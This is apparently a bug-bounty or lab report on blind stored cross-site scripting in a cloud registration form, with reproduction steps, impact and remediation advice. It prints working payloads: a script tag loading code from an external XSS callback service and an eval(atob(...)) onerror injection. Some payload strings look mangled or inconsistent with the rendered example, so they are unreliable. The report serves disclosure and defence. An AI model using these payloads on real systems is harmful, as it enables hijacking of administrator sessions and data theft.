# Blind Cross-Site Scripting (XSS) - Cloud Registration Form

## Summary

I identified a Blind Cross-Site Scripting (XSS) vulnerability in the Registration form of the Informatica Cloud application.

The application accepts user-controlled input through multiple registration fields without proper sanitization or output encoding. The injected payload is stored in the database and executed when an administrator or support staff views the registration data in the admin dashboard. Using a blind XSS payload that triggers an external request to an attacker-controlled XSS reporting service (`https://xss.report`), I was able to confirm the vulnerability without seeing the immediate execution in my own browser.

An attacker can register an account with malicious payloads in the registration fields that, when viewed by administrators in the backend dashboard, execute arbitrary JavaScript. This allows the attacker to steal session cookies, capture sensitive data, and perform actions on behalf of administrators.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Blind Stored**

## Vulnerable Parameters

```text
Full Name
Company Name
Email Address
```

## Vulnerable URL

```text
https://kzlabs.in/63.php?view=register
```

## Steps to Reproduce

1. Navigate to the vulnerable registration page at `https://kzlabs.in/63.php?view=register`.

2. Fill in the registration form with the following payloads:

   - **Full Name**: `">anil"`
   - **Company Name**: `/zW5kQ2hpbGQoYSk7_onerror=eval(atob(this.id))>`
   - **Email Address**: Valid email (e.g., `test@gmail.com`)

3. Click the **Create Account** button to submit the registration form.

4. The payload is stored in the database and will execute when an administrator views the registration data.

5. The blind XSS payload triggers an external request to the attacker-controlled XSS reporting service.

## Payloads Used

```text
Full Name: ">anil"
Company Name: /zW5kQ2hpbGQoYSk7_onerror=eval(atob(this.id))>
```

External payload:
```text
"><script src=https://xss.report/c/koko123></script>
```

## Proof of Concept

The registration form accepts user input and stores it in a database without proper sanitization. When an administrator views the admin dashboard at `https://kzlabs.in/63.php?view=admin_dashboard`, the stored payloads are rendered and executed.

The payload works by:
1. Breaking out of the existing HTML context
2. Injecting an `<img>` tag with an `onerror` event handler
3. The `onerror` event triggers when the image fails to load
4. The `eval(atob(this.id))` decodes and executes the Base64-encoded payload
5. The blind payload generates a callback request to the XSS reporting service

```html
<!-- Injected payload rendered in the page: -->
"><img src="x" onerror="eval(atob(this.id))">
```

The request is logged on the attacker's XSS reporting service, confirming successful execution.

<img width="1731" height="544" alt="Screenshot 2026-08-14 205051" src="https://github.com/user-attachments/assets/f8b895ae-0e99-4e64-b44c-e4dd4110e26f" />
<img width="1647" height="1079" alt="Screenshot 2026-08-14 205119" src="https://github.com/user-attachments/assets/c55cd8a1-ec1c-441a-ac87-721baa9d750b" />
<img width="1906" height="805" alt="Screenshot 2026-08-14 205403" src="https://github.com/user-attachments/assets/e7302d08-f3fd-4673-805a-f108bc617144" />


## Impact

Blind Stored XSS vulnerabilities are extremely dangerous because:

- **Persistent**: Malicious payloads are permanently stored in the database
- **Targeted Impact**: Administrators with elevated privileges are the victims
- **No User Interaction Required**: Victims don't need to click a malicious link
- **Admin Context**: Executes with administrative privileges
- **Sensitive Data**: Registration data often contains sensitive information

An attacker can:

- Steal administrator session cookies and hijack admin accounts
- Perform actions with administrative privileges
- Access sensitive registration data and user information
- Create new admin accounts or backdoors
- Deface the admin dashboard
- Exfiltrate sensitive data from the database
- Install persistent backdoors
- Escalate privileges across the application

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML.
  ```php
  echo htmlspecialchars($fullName, ENT_QUOTES, 'UTF-8');
  echo htmlspecialchars($companyName, ENT_QUOTES, 'UTF-8');
  ```

- **Input Validation**: Validate and sanitize all user inputs before storing. Use a whitelist approach to allow only safe characters.
  ```php
  $companyName = preg_replace('/[^a-zA-Z0-9\s\-_.,]/', '', $_POST['companyName']);
  ```

- **HTML Sanitization**: Use robust sanitization libraries (DOMPurify, HTML Purifier) to strip dangerous tags and attributes.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts, event handlers, and external script sources.

- **Admin Dashboard Security**: Ensure the admin dashboard has proper access controls and is isolated from user input.

- **Context-Aware Escaping**: Use appropriate escaping based on where data is placed (HTML body, attributes, JavaScript).

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block malicious XSS payloads.

- **Security Headers**: Implement `X-XSS-Protection`, `X-Content-Type-Options`, and other security headers.

- **Case-Insensitive Filtering**: Use case-insensitive pattern matching to filter malicious content.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.

- **Admin Awareness**: Educate administrators about the risks of viewing unsanitized user data.

---
